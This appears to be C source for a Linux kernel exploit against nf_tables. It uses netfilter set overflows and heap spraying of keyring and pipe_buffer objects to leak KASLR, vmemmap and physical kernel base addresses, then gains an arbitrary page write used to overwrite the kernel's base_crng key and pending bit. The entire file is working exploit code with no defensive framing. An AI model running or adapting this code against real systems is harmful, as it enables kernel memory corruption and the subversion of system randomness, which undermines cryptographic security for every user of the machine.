#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <linux/netlink.h>
#include <fcntl.h> // Added for debugging pipe only

#include "log.h"
#include "util.h"
#include "keyring.h"
#include "nf_tables.h"
#include "pipe_buffer.h"
#include "libprimitive.h"

#define ID 1337
#define SET_NAME "name\0\0\0"
#define LEAK_SET_NAME "leak\0\0\0"
#define TABLE_NAME "table\0\0"

#define SPRAY_SIZE  300
#define PAGE_SIZE   4096
#define DATA_SIZE   PAGE_SIZE / 8

typedef struct {
    int sock;
    struct sockaddr_nl snl;
    struct pipe_buffer_payload payload;
    struct keyring_payload leak_payload;
    struct leak *leak;
    unsigned long tries;
    long cur_paddr;
    long kaslr_phys_base;
    struct pipe *pipe_buffer;
    struct pipe *victim_pipe;
    key_serial_t *id_buffer;
    char *zap_buf;
    size_t zap_buf_size;
#ifdef LEAK_PAGE
    uint64_t data[DATA_SIZE];
    uint64_t addr;
#endif
} exploit_context;

static void exploit_setup(exploit_context *ctx) {
    //=========================================================================
    // SETUP
    //=========================================================================

    /* Pin the process to the first CPU */
    set_cpu_affinity(0, 0);

    new_ns();
    printf("[+] Get CAP_NET_ADMIN capability\n");

    raise_rlimit(RLIMIT_NOFILE);

    /* Netfilter netlink socket creation */
    if ((ctx->sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0)
        do_error_exit("socket");
    printf("[+] Netlink socket created\n");

    memset(&ctx->snl, 0, sizeof(ctx->snl));
    ctx->snl.nl_family = AF_NETLINK;
    ctx->snl.nl_pid = getpid();
    if (bind(ctx->sock, (struct sockaddr *)&ctx->snl, sizeof(ctx->snl)) < 0)
        do_error_exit("bind");
    printf("[+] Netlink socket bound\n");

    /* Create a netfilter table */
    create_table(ctx->sock, TABLE_NAME);
    printf("[+] Table %s created\n", TABLE_NAME);

    /* Create a netfilter set for the info leak */
    create_set(ctx->sock, LEAK_SET_NAME, KMALLOC64_KEYLEN,
                sizeof(struct keyring_payload), TABLE_NAME, ID);
    printf("[+] Set for the leak created\n");

    /*  Create a netfilter set for the pipe_buffer primitive */
    create_set(ctx->sock, SET_NAME, KMALLOC64_KEYLEN,
                sizeof(struct pipe_buffer_payload), TABLE_NAME, ID + 1);
    printf("[+] Set for write primitive created\n");
}

static void leak_kernel_virtual_base_and_vmemmap_base(exploit_context *ctx) {
        //=========================================================================
    // LEAK KERNEL VIRTUAL BASE AND VMEMMAP BASE
    //=========================================================================

    /* Prepare the payload for the leak */
    memset(&ctx->leak_payload, 0, sizeof(struct keyring_payload));
    ctx->leak_payload.len = USHRT_MAX;

    /* Initialize tries counter */
    ctx->tries = 0;

    printf("[*] Leak #1 in progress\n");
    fflush(stdout);

    while (1) {
        /* Increment number of tries */
        ctx->tries++;

        /* Spray heap with user_key_payload structs to perform an info leak */ 
        ctx->id_buffer = spray_keyring(SPRAY_KEY_SIZE);

        /** Perform the overflow to modify the size of a registered key **/
        add_elem_to_set(ctx->sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME, ID,
                        sizeof(struct keyring_payload), (uint8_t *)&ctx->leak_payload);

        /* Spray the heap with struct pipe_buffer */
        ctx->pipe_buffer = calloc(SPRAY_SIZE, sizeof(struct pipe));
        if (!ctx->pipe_buffer)
            do_error_exit("calloc");
        spray_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer);

        /* Check if the overflow occured on the right object */
        ctx->leak = get_keyring_leak(ctx->id_buffer, SPRAY_KEY_SIZE);
        if (!ctx->leak) {
            release_keys(ctx->id_buffer, SPRAY_KEY_SIZE);
            release_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer);
            continue;
        }

        /* Success! */
        break;
    }
    printf("[+] Leak succeed after %lu tries\n", ctx->tries);
    printf("[+] kaslr base = 0x%lx\n", ctx->leak->kaslr_base);
    printf("[+] vmemmap base = 0x%lx\n", ctx->leak->vmemmap_base);
    printf("[+] base_crng = 0x%lx\n", ctx->leak->base_crng);
    printf("[+] pending_bit = 0x%lx\n", ctx->leak->pending_bit);

    /* Cleanup */
    release_keys(ctx->id_buffer, SPRAY_KEY_SIZE);
    release_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer);
}

static void leak_kernel_physical_base(exploit_context *ctx) {
    //=========================================================================
    // LEAK KERNEL PHYSICAL BASE
    //=========================================================================
    
    /* Prepare the payload for leaking the kernel physical base address */
    memset(&ctx->payload, 0, sizeof(struct pipe_buffer_payload));
    ctx->cur_paddr = PHYSICAL_START;
    ctx->payload.page = (void *)paddr_to_page(ctx->leak->vmemmap_base, ctx->cur_paddr);
    ctx->payload.len  = 16 /* bytes */;

    /* Initialize tries counter */
    ctx->tries = 0;

    printf("[*] Leak #2 in progress\n");
    fflush(stdout);

    while (1) {
        /* Increment number of tries */
        ctx->tries++;

        /* Spray heap to find the physical base address of the kernel image */
        ctx->pipe_buffer = calloc(SPRAY_SIZE, sizeof(struct pipe));
        if (!ctx->pipe_buffer)
            do_error_exit("calloc");
        spray_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer);

        add_elem_to_set(ctx->sock, SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME, ID,
                        sizeof(struct pipe_buffer_payload), (uint8_t *)&ctx->payload);

        /* Check if we found the physical kernel base address */
        ctx->kaslr_phys_base = get_phys_base(SPRAY_SIZE, ctx->pipe_buffer, ctx->cur_paddr);
        if (!ctx->kaslr_phys_base) {
            /*
             * Note: we don't release_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer)
             * here to prevent the kernel from crashing since we modify the
             * struct page pointer.
             */ 
            if (ctx->tries % 10 == 0) {
                ctx->cur_paddr += INCREMENT_SIZE;
                ctx->payload.page = (void *)paddr_to_page(ctx->leak->vmemmap_base, ctx->cur_paddr);
            }
            continue;
        }

        /* Success! */
        break;
    }
    printf("[+] Leak successful after %lu tries\n", ctx->tries);
    printf("[+] physical kernel address = 0x%lx\n", ctx->kaslr_phys_base);
}

static void get_arbitrary_write(exploit_context *ctx) {
    //=========================================================================
    // GET ARBITRARY WRITE
    //=========================================================================

    /* Initialize tries counter */
    ctx->tries = 0;

    printf("[*] Struct page overwrite in progress\n");
    fflush(stdout);

    while (1) {
        /* Increment number of tries */
        ctx->tries++;

        /* Spray heap to find the physical base address of the kernel image */
        ctx->pipe_buffer = calloc(SPRAY_SIZE, sizeof(struct pipe));
        if (!ctx->pipe_buffer)
            do_error_exit("calloc");
        spray_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer);

        add_elem_to_set(ctx->sock, SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME, ID,
                        sizeof(struct pipe_buffer_payload), (uint8_t *)&ctx->payload);

        /* Find the pipe that we overwrote the struct page of */
        ctx->victim_pipe = get_victim_pipe(SPRAY_SIZE, ctx->pipe_buffer);
        if (!ctx->victim_pipe) {
            release_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer);
            continue;
        }

        printf("before fcntl\n");
        fcntl(ctx->victim_pipe->write, F_GETPIPE_SZ);
        printf("after fcntl\n");

#ifdef LEAK_PAGE
        int i;
        if ((read(ctx->victim_pipe->read, ctx->data, PAGE_SIZE)) == -1)
            do_error_exit("read(ctx->victim_pipe)");

        printf("[+] Data:\n");
        for (i = 0; i < DATA_SIZE; i+=2) {
            ctx->addr = (ctx->leak->base_crng & ~0xfffUL) + (i * 8);

            /* Add some highlighting to non-zero lines */
            if (ctx->data[i] != 0x0 || ctx->data[i + 1] != 0x0) {
                printf("\e[0;30;102m[0x%016lx] 0x%016lx 0x%016lx\e[m\n",
                        ctx->addr, ctx->data[i], ctx->data[i + 1]);
            } else {
                printf("[0x%016lx] 0x%016lx 0x%016lx\n",
                        ctx->addr, ctx->data[i], ctx->data[i + 1]);
            }
        }
#endif
    
        //ctx->zap_buf = malloc(ctx->zap_buf_size);
        //memset(ctx->zap_buf, 0, ctx->zap_buf_size);
        if ((write(ctx->victim_pipe->write, ctx->zap_buf, ctx->zap_buf_size)) == -1)
            do_error_exit("write(ctx->victim_pipe)");

        printf("[+] Zapped after %lu tries!\n", ctx->tries);

        /* Success! */
        break;
    }
}

void trigger_overwrite_of_l1_key(void) {
    //struct exploit_context *ctx = calloc(1, sizeof(struct exploit_context));
    exploit_context ctx = {0};

    exploit_setup(&ctx);
    leak_kernel_virtual_base_and_vmemmap_base(&ctx);
    leak_kernel_physical_base(&ctx);

    /* Prepare the payload for leaking the kernel physical base address */
    ctx.zap_buf_size = BASE_CRNG_ZAP_SIZE;
    ctx.zap_buf = malloc(ctx.zap_buf_size);
    memset(ctx.zap_buf, 0, ctx.zap_buf_size);

    memset(&ctx.payload, 0, sizeof(struct pipe_buffer_payload));
    ctx.payload.page = (void *)paddr_to_page(ctx.leak->vmemmap_base, ctx.kaslr_phys_base) +
                    ((BASE_CRNG_OFFSET >> 12) * STRUCT_PAGE_SIZE);
    ctx.payload.len  = (ctx.leak->base_crng & 0xfffUL);
    get_arbitrary_write(&ctx);
}

void trigger_overwrite_of_pending_bit(void) {
    exploit_context ctx = {0};

    exploit_setup(&ctx);
    leak_kernel_virtual_base_and_vmemmap_base(&ctx);
    leak_kernel_physical_base(&ctx);

    /* Prepare the payload for leaking the kernel physical base address */
    ctx.zap_buf_size = PENDING_BIT_ZAP_SIZE;
    ctx.zap_buf = malloc(ctx.zap_buf_size);
    memset(ctx.zap_buf, 1, ctx.zap_buf_size);

    memset(&ctx.payload, 0, sizeof(struct pipe_buffer_payload));
    ctx.payload.page = (void *)paddr_to_page(ctx.leak->vmemmap_base, ctx.kaslr_phys_base) +
                    ((BASE_CRNG_OFFSET >> 12) * STRUCT_PAGE_SIZE);
    ctx.payload.len  = (ctx.leak->pending_bit & 0xfffUL);
    get_arbitrary_write(&ctx);
}

